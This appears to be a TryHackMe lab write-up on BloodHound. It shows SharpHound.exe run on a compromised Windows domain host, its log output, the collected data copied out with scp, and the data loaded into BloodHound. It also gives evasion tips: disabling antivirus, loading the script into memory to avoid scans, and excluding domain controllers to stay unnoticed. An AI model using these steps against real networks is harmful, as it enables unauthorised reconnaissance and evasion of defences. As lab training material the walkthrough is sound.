# Introduction

- There two different software in bloodhound framework

> 1. Sharphound - It collects data from the windows machine and convert it into zip or json files which can be sent to bloodhound for making graphs
> 2. Bloodhound - It makes graphs out  of the data collected from the sharphound binary

- There are three type of Sharphounds 

> 1. Sharphound.ps1 - PowerShell script for running Sharphound. However, the latest release of Sharphound has stopped releasing the Powershell script version. This version is good to use with RATs since the script can be loaded directly into memory, evading on-disk AV scans.
> 2. Sharphound.exe - A Windows executable version for running Sharphound.
> 3. AzureHound.ps1 - PowerShell script for running Sharphound for Azure (Microsoft Cloud Computing Services) instances. Bloodhound can ingest data enumerated from Azure to find attack paths related to the configuration of Azure Identity and Access Management.

- In this room we will use `Sharphound.exe` for enumeration.
- Generally `sharphound` is noticed by the AV, but we can turn it off as we have access to the machine or we can add it to trusted binaries.

# Process

## Compromised machine
- We can start `SharpHound.exe` with 

```console
Sharphound.exe --CollectionMethods <Methods> --Domain <DOMAIN NAME> --ExcludeDCs --OutputPrefix <FILENAME>
```
> CollectionMethods - There are different types of collection methods in sharphound, but the most common one is all.
> Domain - Domain Name we would like to enumerate
> ExcludeDCs - This flag is used to exclude Domain Controller so that the script runs unnoticable on the server.
> OutputPrefixe - File name for the output of zip file

- Started the exploit in Documents directory of the user

```console
PS C:\Users\lynda.franklin\Documents> .\SharpHound.exe --CollectionMethods all --Domain za.tryhackme.com --ExcludeDCs --OutputPrefix "Financial Audit"
2022-11-10T14:46:42.5545560+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTarg
ets, PSRemote
2022-11-10T14:46:42.5545560+00:00|INFORMATION|Initializing SharpHound at 2:46 PM on 11/10/2022
2022-11-10T14:46:43.1232208+00:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-11-10T14:46:43.3283833+00:00|INFORMATION|Beginning LDAP search for za.tryhackme.com
2022-11-10T14:47:13.4722368+00:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 50 MB RAM
2022-11-10T14:47:29.1109532+00:00|WARNING|[CommonLib LDAPUtils]LDAP Exception in Loop: 81. (null). The LDAP server is unavailable.. Filter: (&(objectclass=trusteddomain)(securityident
ifier=S-1-5-21-3330634377-1326264276-632209373)). Domain: (null)
System.DirectoryServices.Protocols.LdapException: The LDAP server is unavailable.
   at System.DirectoryServices.Protocols.LdapConnection.ConstructResponse(Int32 messageId, LdapOperation operation, ResultAll resultType, TimeSpan requestTimeOut, Boolean exceptionOnT
imeOut)
   at System.DirectoryServices.Protocols.LdapConnection.SendRequest(DirectoryRequest request, TimeSpan requestTimeout)
   at SharpHoundCommonLib.LDAPUtils.<QueryLDAP>d__33.MoveNext()
2022-11-10T14:47:29.1266176+00:00|WARNING|[CommonLib LDAPUtils]LDAP Exception in Loop: 81. (null). The LDAP server is unavailable.. Filter: (&(objectclass=domain)(objectsid=\01\04\00\
00\00\00\00\05\15\00\00\00\89\72\85\C6\D4\2F\0D\4F\DD\BF\AE\25)). Domain: (null)
System.DirectoryServices.Protocols.LdapException: The LDAP server is unavailable.
   at System.DirectoryServices.Protocols.LdapConnection.ConstructResponse(Int32 messageId, LdapOperation operation, ResultAll resultType, TimeSpan requestTimeOut, Boolean exceptionOnT
imeOut)
   at System.DirectoryServices.Protocols.LdapConnection.SendRequest(DirectoryRequest request, TimeSpan requestTimeout)
   at SharpHoundCommonLib.LDAPUtils.<QueryLDAP>d__33.MoveNext()
2022-11-10T14:47:30.2514949+00:00|INFORMATION|Producer has finished, closing LDAP channel
2022-11-10T14:47:30.2671181+00:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-11-10T14:47:29.1266176+00:00|WARNING|[CommonLib LDAPUtils]LDAP Exception in Loop: 81. (null). The LDAP server is unavailable.. Filter: (&(objectclass=domain)(objectsid=\01\04\00\
00\00\00\00\05\15\00\00\00\89\72\85\C6\D4\2F\0D\4F\DD\BF\AE\25)). Domain: (null)
System.DirectoryServices.Protocols.LdapException: The LDAP server is unavailable.
   at System.DirectoryServices.Protocols.LdapConnection.ConstructResponse(Int32 messageId, LdapOperation operation, ResultAll resultType, TimeSpan requestTimeOut, Boolean exceptionOnT
imeOut)
   at System.DirectoryServices.Protocols.LdapConnection.SendRequest(DirectoryRequest request, TimeSpan requestTimeout)
   at SharpHoundCommonLib.LDAPUtils.<QueryLDAP>d__33.MoveNext()
2022-11-10T14:47:29.1266176+00:00|WARNING|[CommonLib LDAPUtils]LDAP Exception in Loop: 81. (null). The LDAP server is unavailable.. Filter: (&(objectclass=domain)(objectsid=\01\04\00\
00\00\00\00\05\15\00\00\00\89\72\85\C6\D4\2F\0D\4F\DD\BF\AE\25)). Domain: (null)
System.DirectoryServices.Protocols.LdapException: The LDAP server is unavailable.
   at System.DirectoryServices.Protocols.LdapConnection.SendRequest(DirectoryRequest request, TimeSpan requestTimeout)
   at SharpHoundCommonLib.LDAPUtils.<QueryLDAP>d__33.MoveNext()
2022-11-10T14:47:31.1107181+00:00|INFORMATION|Consumers finished, closing output channel
2022-11-10T14:47:31.1576403+00:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-11-10T14:47:31.7724624+00:00|INFORMATION|Status: 2159 objects finished (+2159 44.97917)/s -- Using 51 MB RAM
2022-11-10T14:47:31.7730488+00:00|INFORMATION|Enumeration finished in 00:00:48.4559323
2022-11-10T14:47:32.0316283+00:00|INFORMATION|SharpHound Enumeration Completed at 2:47 PM on 11/10/2022! Happy Graphing!
PS C:\Users\lynda.franklin\Documents> ls


    Directory: C:\Users\lynda.franklin\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/10/2022   2:47 PM         121184 Financial Audit_20221110144729_BloodHound.zip
-a----        3/16/2022   5:19 PM         906752 SharpHound.exe
-a----       11/10/2022   2:47 PM         359470 YzE4MDdkYjAtYjc2MC00OTYyLTk1YTEtYjI0NjhiZmRiOWY1.bin
```

- Copied this to my own system with scp

## Attacking Machine

```console
❯ scp "za.tryhackme.com\\lynda.franklin@thmjmp1.za.tryhackme.com:C:/Users/lynda.franklin/Documents/Financial Audit_20221110144729_BloodHound.zip"   .
za.tryhackme.com\lynda.franklin@thmjmp1.za.tryhackme.com's password:
Financial Audit_20221110144729_BloodHound.zip     100%  118KB 117.6KB/s   00:01
```

- Started `neo4j` console with `sudo` rights

```console
❯ sudo neo4j console
[sudo] password for divu050704:
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /usr/share/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /usr/share/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /usr/share/neo4j/run
Starting Neo4j.
2022-11-10 14:51:09.681+0000 INFO  Starting...
2022-11-10 14:51:10.700+0000 INFO  This instance is ServerId{fb27b5db} (fb27b5db-65a8-4bf2-a975-784965d0f3f5)
2022-11-10 14:51:13.605+0000 INFO  ======== Neo4j 4.4.7 ========
2022-11-10 14:51:15.960+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2022-11-10 14:51:15.961+0000 INFO  Updating the initial password in component 'security-users'
2022-11-10 14:51:18.266+0000 INFO  Bolt enabled on localhost:7687.
2022-11-10 14:51:19.657+0000 INFO  Remote interface available at http://localhost:7474/
2022-11-10 14:51:19.662+0000 INFO  id: 4AC57FDD6CA08E512162A5AB11FD1F4FCF9E0838C68C5D4741A39DA9F04A807F
2022-11-10 14:51:19.663+0000 INFO  name: system
2022-11-10 14:51:19.663+0000 INFO  creationDate: 2022-11-10T06:15:55.763Z
2022-11-10 14:51:19.663+0000 INFO  Started.

```
- Started bloodhound without sandbox

```console
❯ bloodhound --no-sandbox
(node:10749) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron.  See https://github.com/electron/electron/issues/23506 for more information
(node:10796) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
```

- Logged in
- Dragged zip file to the bloodhound and Started enumeration
![screenshot for zip upload to bloodhound](https://github.com/divu050704/assets-holder/raw/main/Screenshot_2022-11-10_20-25-07.png)

